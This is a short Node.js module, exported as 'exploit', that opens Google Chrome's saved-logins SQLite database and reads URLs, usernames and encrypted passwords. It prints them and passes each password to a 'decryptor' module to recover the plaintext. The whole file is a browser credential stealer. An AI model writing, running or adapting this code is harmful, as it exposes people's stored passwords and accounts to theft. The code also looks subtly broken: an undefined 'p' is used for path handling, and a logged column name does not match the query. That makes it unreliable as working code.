const s = require('sqlite3').verbose(),
	pwnd = require("./decryptor"),
	check = require("./system_check/sys_check");

module.exports = exploit = (async () => {
	try {
		let db = await s.Database(p.normalize(check.win32("chrome"), (e) => {
			if (e) return console.error(e);
			console.log('Connected to Database');
		}));

		db.serialize(async () => {
			db.each(
				"SELECT action_url, username_value, password_value FROM logins",
				async (e, row) => {
					if (e) return console.error(e);
					console.log(`URL: ${row.action_url}`);
					console.log(`Username: ${row.username}`);
					console.log('Password Cipher: ' + row.password_value);

					console.time();
					// run func to decrypt.
					let enc = row.password_value;
					enc = await pwnd.fndEnc(enc);
					return await pwnd.decrypt(enc);
				}
			);
		});
	} catch (e) {
		console.error(e);
	}
});
